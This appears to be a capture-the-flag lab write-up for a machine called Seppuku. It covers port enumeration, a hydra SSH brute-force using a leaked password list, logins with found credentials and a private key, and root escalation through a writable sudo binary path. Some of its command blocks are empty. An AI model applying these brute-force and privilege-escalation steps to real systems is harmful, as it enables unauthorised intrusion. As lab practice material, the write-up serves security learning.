# Seppuku

**IP Address:** 192.168.76.90

## Enumeration
### Open Ports
| Port #| Service | Details  |
|:------|:---------|:---------|
| 21    | ftp      | vsftpd 3.0.3 | 
| 22    | ssh      | OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) |
| 80    | http     | nginx 1.14.2 |
| 139   | smb      | Samba smbd 3.X - 4.X (workgroup: WORKGROUP) | 
| 445   | smb      | Samba smbd 4.9.5-Debian (workgroup: WORKGROUP) | 
| 7080  | http     | LiteSpeed httpd |
| 7601  | http     | Apache httpd 2.4.38 ((Debian)) | 
| 8088  | http     | LiteSpeed httpd |

rabbit-hole


## Exploitation (seppuku account)
### Exploit Details (Bruteforce login)
* **Name** - Bruteforce login
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A

A password list file was found at http://192.168.76.90:7601/secret/password.lst this file can be used to bruteforce the login for the "seppuku" user login. 

Commands
```bash
hydra $ip -s 22 ssh -l seppuku -P password.lst -F
ssh seppuku@$ip
eeyoree
whoami
cat local.txt
```
![Set Options](images/exploit1.png)

## Exploitation (tanto account)
### Exploit Details (Found credentials)
* **Name** - Found credentials
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A

Once we have logged into the seppuku account we can see that there is other users (samurai, tanto & root). We can log into the tanto account using the private key we found at http://192.168.76.90:7601/keys/private

Commands
```bash
chmod 600 private

```

![Set Options](images/exploit2.png)

## Pivot (samurai account)
### Exploit Details (Found credentials)
* **Name** - Found credentials
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A

Commands
```bash
cat .passwd
12345685213456!@!@A
whoami
```
![Execute Exploit](images/privesc11.png)



## Privilege Escalation)
### Exploit Details (Sudo rights)
* **Name** - Sudo rights
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A

In the samurai account we can see that we have access to the sudo command "/../../../../../../home/tanto/.cgi_bin/bin /tmp/*" however the binary doesn't exist in the path. Because we have access to the tanto account we have permissions to place any binary we like here. 

Commands
```bash
sudo -l
ls -al /home/tanto
```

![Execute Exploit](images/privesc12.png)

As the tanto account has a restricted rbash we have to escape this before reconnecting. 

Command

```bash

```



Commands
```bash
sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/shell
whoami
cat local.txt
```